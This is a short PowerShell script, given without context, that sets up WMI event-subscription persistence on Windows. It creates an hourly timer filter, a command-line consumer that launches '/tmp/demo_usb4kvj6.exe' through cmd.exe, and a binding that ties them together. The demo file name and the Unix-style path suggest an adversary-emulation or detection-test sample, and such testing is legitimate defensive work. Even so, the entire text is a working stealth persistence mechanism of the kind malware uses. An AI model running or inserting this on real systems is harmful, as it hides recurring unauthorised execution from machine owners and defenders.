
$filterArgs = @{Name='MyFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __IntervalTimerEvent WHERE TimerID='MyTimer' AND IntervalBetweenFirings=3600000"}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
$consumerArgs = @{Name='MyConsumer'; CommandLineTemplate='"/tmp/demo_usb4kvj6.exe"'; ExecutablePath="cmd.exe"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}
